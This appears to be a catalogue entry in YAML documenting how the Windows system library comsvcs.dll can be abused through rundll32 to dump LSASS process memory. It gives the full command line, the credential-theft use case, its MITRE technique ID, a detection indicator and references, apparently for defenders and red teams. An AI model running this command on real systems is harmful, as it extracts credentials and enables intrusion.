---
Name: Comsvcs.dll
Description: COM+ Services
Author:
Created: 2019-08-30
Commands:
  - Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump "[LSASS_PID] dump.bin full"
    Description: Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.
    Usecase: Dump Lsass.exe process memory to retrieve credentials.
    Category: Dump
    Privileges: SYSTEM
    MitreID: T1003.001
    OperatingSystem: Windows
Full_Path:
  - Path: c:\windows\system32\comsvcs.dll
Code_Sample:
  - Code: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
Detection:
  - IOC: MiniDump being used in library
Resources:
  - Link: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
Acknowledgement:
  - Person: modexp
    Handle:
---
